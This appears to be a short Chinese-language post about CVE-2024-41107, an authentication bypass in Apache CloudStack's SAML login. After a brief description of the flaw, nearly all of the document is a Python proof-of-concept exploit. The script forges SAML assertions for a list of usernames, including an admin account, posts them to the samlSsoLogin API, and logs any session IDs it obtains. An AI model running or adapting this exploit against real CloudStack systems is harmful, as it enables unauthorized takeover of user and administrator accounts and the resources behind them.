# Apache-CloudStack中的SAML身份验证漏洞(CVE-2024-41107)

Apache软件基金会发布了一则关于其开源云计算平台Apache CloudStack的严重漏洞（CVE-2024-41107）的安全公告。此漏洞影响安全断言标记语言（SAML）认证机制，可能允许攻击者绕过认证，获得对用户账户和资源的未授权访问。

## poc

```python
import requests
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
import xml.etree.ElementTree as ET
import base64
import logging

# Setup logging
logging.basicConfig(filename='exploit.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# URL of the login endpoint
url = "http://target-cloudstack-instance.com/client/api"

# Function to generate dynamic SAML response
def generate_saml_response(username):
    issue_instant = datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')
    not_on_or_after = (datetime.utcnow() + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
    
    saml_response = f"""
    <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_8f0d8b57b7b34a1a8f0d8b57b7b34a1a" Version="2.0" IssueInstant="{issue_instant}" Destination="{url}">
        <saml:Issuer>http://your-saml-issuer.com</saml:Issuer>
        <samlp:Status>
            <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
        </samlp:Status>
        <saml:Assertion Version="2.0" ID="_abc123" IssueInstant="{issue_instant}">
            <saml:Issuer>http://your-saml-issuer.com</saml:Issuer>
            <saml:Subject>
                <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{username}</saml:NameID>
                <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                    <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}" Recipient="{url}"/>
                </saml:SubjectConfirmation>
            </saml:Subject>
            <saml:Conditions NotBefore="{issue_instant}" NotOnOrAfter="{not_on_or_after}">
                <saml:AudienceRestriction>
                    <saml:Audience>{url}</saml:Audience>
                </saml:AudienceRestriction>
            </saml:Conditions>
            <saml:AuthnStatement AuthnInstant="{issue_instant}" SessionIndex="_abc123">
                <saml:AuthnContext>
                    <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
                </saml:AuthnContext>
            </saml:AuthnStatement>
        </saml:Assertion>
    </samlp:Response>
    """
    return base64.b64encode(saml_response.encode('utf-8')).decode('utf-8')

# List of usernames to attempt access
usernames = ["user1@example.com", "user2@example.com", "admin@example.com"]

# Function to attempt login with SAML response
def attempt_login(saml_response):
    data = {
        "command": "samlSsoLogin",
        "SAMLResponse": saml_response
    }
    response = requests.post(url, data=data)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        session_id = soup.find('sessionid')
        if session_id:
            logging.info(f"Login successful, session ID: {session_id.text}")
            print(f"Login successful, session ID: {session_id.text}")
        else:
            logging.info("Login failed, no session ID found in response.")
            print("Login failed, no session ID found in response.")
    else:
        logging.info(f"Login failed, status code: {response.status_code}")
        print(f"Login failed, status code: {response.status_code}")

# Attempt login for each username
for username in usernames:
    saml_response = generate_saml_response(username)
    attempt_login(saml_response)
```



## 漏洞来源

- https://github.com/d0rb/CVE-2024-41107/blob/main/PoC.py